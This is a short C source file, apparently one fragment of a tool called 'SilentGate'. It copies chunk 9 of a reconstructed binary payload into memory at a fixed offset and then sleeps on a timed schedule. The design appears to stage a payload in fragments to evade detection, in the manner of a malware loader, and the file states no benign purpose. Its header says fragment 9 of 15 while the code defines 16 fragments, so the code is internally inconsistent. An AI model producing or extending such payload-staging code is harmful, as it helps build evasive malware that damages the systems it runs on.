/*
 * SilentGate Fragment 9/15
 * Offset: 67374 bytes  Size: 7486 bytes
 * Schedule: t=730ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   9
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  119778
#define CHUNK_OFFSET  67374
#define CHUNK_SIZE    7486
#define SLEEP_NEXT_MS 730

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 9: Write chunk 9 */
void sg_execute_fragment_9(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 9] Writing chunk at t=730ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 9] Chunk 9 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
